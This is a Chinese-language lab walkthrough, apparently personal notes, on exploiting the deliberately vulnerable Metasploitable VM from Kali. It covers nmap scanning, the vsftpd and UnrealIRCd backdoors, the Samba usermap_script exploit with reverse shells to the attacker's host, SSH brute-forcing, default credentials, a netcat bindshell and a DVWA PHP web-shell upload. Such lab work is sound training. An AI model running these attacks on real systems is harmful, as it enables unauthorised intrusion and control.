# Metasploitable demo

靶機記得要設置網路

https://reurl.cc/V0XnQb

KALI: 192.168.75.130
靶機: 192.168.75.131

[前言介紹](https://ithelp.ithome.com.tw/articles/10344154)
[環境架設](https://reurl.cc/V0XnQb)

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

![image](https://hackmd.io/_uploads/SyMSoEYMyg.png)

- sudo nmap -F 192.168.75.0/24
    - 快速掃描整個子網中的主機和開放端口
    - -F
        - 快速模式（Fast Scan Mode）
        - 只掃描常見的 100 個 port，而非完整 65535 個 port

- sudo nmap -sV -O 192.168.75.131
    - -sV
        - 掃描開放的 port，並嘗試檢測服務的詳細版本資訊
    - -O
        - 通過分析網絡數據包的回應，嘗試識別目標主機的操作系統

- vsftpd 2.3.4
    - vsftpd
        - 一個類Unix系統以及Linux上的FTP伺服器軟體
    - 21 port
    - 笑臉漏洞：這個漏洞是開發者在軟體中留下的後門漏洞，當連接帶有vsftpd 2.3.4版本的伺服器的21埠時，輸入使用者中帶有「:) 」,密碼任意，即可執行vsf_sysutil_extra () ：開啟伺服器的6200端口，並且不需要密碼就能從6200端口以管理員身份登錄目標伺服器。因為輸入使用者名稱需要帶有:)，所以稱為笑臉漏洞
    - 步驟
        - 開一個 terminal
            - telnet 192.168.75.131 21
                - 連上 21 port
            - user attack:)
                - 輸入任意username，帶上:)
            - pass 123456
                - 密碼隨意設定
            - ![image](https://hackmd.io/_uploads/SJqlnl6Mkg.png)

        - 開第二個 terminal
            - telnet 192.168.75.131 6200
                - 連上 6200 port
            - 發現可連上，可輸入command line
            - id;
                - 檢查目前使用者的身份
            - python -c 'import pty;pty.spawn("/bin/bash")';
                - 這段 Python 指令用於獲取pseudo-terminal
            - ![image](https://hackmd.io/_uploads/B1Byhl6zyl.png)

- telnet
    - sudo nmap -sV 192.168.1.5
        - 看到Linux telnetd版本未提供具體版本信息
    - sudo msfconsole
    - searchsploit telnetd
        - 沒有直接適用於該版本的漏洞利用
    - telnet 192.168.75.131
        - 嘗試使用默認憑據進行登錄
        - 就看到登入憑證
        - ![image](https://hackmd.io/_uploads/S1l-G1MTMke.png)
    - whoami
        - 發現用戶身分為 msfadmin
    - sudo su
        - 提升權限
        - Password: msfadmin
    - whoami
        - 取得root用戶身分
    - 結論
        - 訊息洩露漏洞，通過暴露的默認憑據進行利用。
        - 在現實中，這樣的漏洞較少見

- PostgreSQL
    - 弱密碼攻擊
    - psql -h 10.0.0.112 -U postgres
        - password: msfadmin

- vnc
    - 弱密碼攻擊
    - vncviewer 10.0.0.112
        - password: password

- OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    - 思路:暴力破解
    - cd /usr/share/metasploit-framework/data/wordlists/
    - ls
    - sudo msfconsole
        - search ssh_login
            - ![image](https://hackmd.io/_uploads/rkLlgZTMyl.png)
            - 搜尋 ssh login 攻擊的payload
        - use auxiliary/scanner/ssh/ssh_login
            - 選擇 payload
        - show options
            - 查看參數
            - yes為必填
        - set RHOST 192.168.75.131
            - 設置目標機 ip
        - set userpass_file /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
            - 設定 username password 字典
        - mousepad /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
            - 開另一個 terminal 查看
        - set verbose false
            - 避免輸出太多大量資訊
        - show options
            - 確認參數配置
        - exploit
            - 一有成功output就 ctrl+c 退出
            - 需要幾分鐘
            - ![image](https://hackmd.io/_uploads/BJAFMWpfyg.png)
                - user:user
        - sessions -i <session_id>
            - 當配對成功的時候，攻擊腳本會自動建立一個 SSH 連線會話
            - 使用這個指令 terminal 切換到 session 中
            - ex: sessions -i 1
    - ssh root@192.168.60.101
        - 也可以直接 ssh 連接

- Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    - sudo nmap -sV 192.168.75.131
        - 觀察掃描結果，注意port 139 和 445 上的 Samba 服務
        - Nmap 未能提供精確的 Samba 版本資訊
            - ![image](https://hackmd.io/_uploads/rJ1GezaG1l.png)
    - sudo msfconsole
        - 先識別 Samba 版本
        - 打開 Metasploit 控制台
        - search samba
            - 搜尋 Metasploit 框架中的輔助模組來探測 Samba 版本
        - use auxiliary/scanner/smb/smb_version
            - 使用 Samba 版本探測器
        - show options
            - 確認參數配置
        - set RHOSTS 192.168.75.131
            - 設置目標機 ip
        - run
            - 成功顯示目標機器上運行的確切 Samba 版本 Samba 3.0.20-Debian
            - ![image](https://hackmd.io/_uploads/SJfLGGaGkl.png)
        - searchsploit samba 3.0.20
            - 接著尋找適用的漏洞
            - ![image](https://hackmd.io/_uploads/r1_0zzpMye.png)
            - 結果顯示適用於我們目標版本的幾個漏洞，其中 `usermap script` 漏洞是我們感興趣的
        - search samba
            - 在 Metasploit 中搜尋該漏洞模組
        - use exploit/multi/samba/usermap_script
            - 在 Metasploit 中使用該漏洞模組
        - show options
            - 確認參數配置
        - set RHOSTS 192.168.75.131
            - 設置目標機 ip
        - set LHOST 192.168.75.130
            - 設定遠端主機 IP
            - set LHOST <your_kali_ip>
        - set LPORT 4444
            - 設定遠端主機 port
        - exploit
            - 執行漏洞利用
            - 獲得目標系統上的命令行 shell
                - ![image](https://hackmd.io/_uploads/ry33NMTf1l.png)
            - whoami
                - 成功訪問目標系統，並以 root 身份運行命令

- bindshell   Metasploitable root shell
    - 1524 port 看起來很怪
    - Bind Shell
        - 是在目標主機中，將 Shell (或其他執行的程式) 綁定在某一個 Port 上，執行由那個 Port 收到的指令，而攻擊者就可以建立連線後，利用對這個 Port 發送指令進而執行攻擊指令。
        - ![image](https://hackmd.io/_uploads/HkKd6ZpGyl.png)
    - nc 192.168.75.131 1524
        - 使用Netcat進行連接並獲得shell訪問
    - whoami
        - 輸出應顯示root，表明您已成功獲得目標系統的最高權限。
    - 錯誤配置導致的漏洞，通常由於用戶配置不當而發生，這種情況在現實中很少見

- UnreallRCd
    - 背景
        - 在 2009 年 11 月到 2010 年 6 月間，UnrealIRCd（一款開源的 IRC 服務器軟件）的一些鏡像站點分發了被植入惡意代碼的版本。
        - 攻擊者只需通過 IRC 客戶端發送特定格式的惡意命令，即可觸發這段代碼。
        - 受影響的伺服器會在無需身份驗證的情況下執行攻擊者指定的系統命令，從而完全控制目標伺服器。
        - 被感染的版本是 UnrealIRCd 3.2.8.1
    - sudo nmap -A -sV -p 6667 192.168.75.131
        - -A
            - 進階探測模式，這可能會獲取更詳細的版本資訊
            - 確定 UnrealIRCd 版本為 3.2.8.1
            - ![image](https://hackmd.io/_uploads/SJMNB8afkl.png)

    - search unreal ircd
        - 搜尋ircd的相關工具或攻擊payload
        - ![image](https://hackmd.io/_uploads/Bkko5fTMkl.png)
    - use exploit/unix/irc/unreal_ircd_3281_backdoor
    - show options
        - 確認參數配置
    - show payloads
        - 查看可用 payloads 
    - set payload cmd/unix/reverse_perl
        - 選擇payloads
    - set RHOSTS 192.168.75.131
        - 設置目標機 ip
    - set LHOST 192.168.75.130
        - 設定遠端主機 IP
    - run
        - ![image](https://hackmd.io/_uploads/BJdd-86f1g.png)
        - 可直接執行指令
        - id
        - whoami
        - python -c 'import pty;pty.spawn("/bin/bash")';

---

- open browser
- cd /usr/share/wordlists/dirb
    - 查看 kali中提供的 字典路徑 wordlist
- 兩個常用的網站目錄爆破工具
    - dirb
        - dirb [target][wordlist]
        - dirb http://192.168.75.131 common.txt
    - gobuster
        - 安裝
            - sudo apt update
                - 更新軟件包清單
            - sudo apt install gobuster
        - gobuster [mode] -u [target URL] -w [wordlist] [optional flags]
        - gobuster dir -u http://192.168.75.131 -w common.txt

- 開啟DVWA
    - 憑證: admin/password
    - 1
        - DVWA Security -> low
        - Sidebar -> Upload
        - cd /usr/share/webshells/php/
        - cp simple-backdoor.php ~
        - cd ~
        - 上傳 simple-backdoor.php
        - 於網址直接呼叫shell
            - http://192.168.75.131/dvwa/hackable/uploads/simple-backdoor.php?cmd=whoami
        - 回顧
            - 檔案上傳攻擊
            - 漏洞: 伺服器未充分驗證上傳檔案的內容或類型，導致攻擊者可以上傳任意檔案
    - 2
        - DVWA Security -> Medium
        - Sidebar -> Upload
        - cd /usr/share/webshells/php/
        - cp simple-backdoor.php ~
        - cp simple-backdoor.php simple-backdoor.pHP
            - 上傳
            - 行不通
        - cp simple-backdoor.php simple-backdoor.php.jpg
            - 上傳
            - 將檔名改為 .php.jpg，漏洞仍然能執行的原因，主要是因為目標伺服器對文件上傳處理和文件解析的安全性不足。
            - 只判斷檔名，但Server仍然執行內容


---

KALI: 192.168.75.130
靶機: 192.168.75.131


https://reurl.cc/36LRXX


